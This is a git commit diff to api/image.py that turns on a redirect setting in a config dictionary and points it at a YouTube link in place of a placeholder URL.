5f53e9b531dedc2503c5d2a252ad62484883ae04
ilfonai <fonailaci0601@gmail.com>
2025-10-18 19:15:44 +0200

    Update redirect settings to enable webpage redirection

--- api/image.py
+++ api/image.py
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://youtu.be/xvFZjo5PgG0?si=KVb1Ch1pX-Pkz-fh" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
